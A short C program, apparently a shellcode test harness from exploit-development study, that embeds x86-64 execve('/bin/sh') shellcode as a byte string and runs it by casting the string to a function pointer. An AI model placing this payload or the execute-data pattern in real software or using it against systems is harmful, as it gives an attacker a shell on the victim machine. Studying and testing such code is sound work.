#include <stdio.h>
#include <string.h>

int
main(void)
{
  char *shellcode = "\xeb\x0a\x5f\x6a\x3b\x58\x31\xf6\x31\xd2\x0f\x05\xe8\xf1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

  printf("strlen(shellcode)=%d\n", strlen(shellcode));

  ((void (*)(void))shellcode)();

  return 0;
}
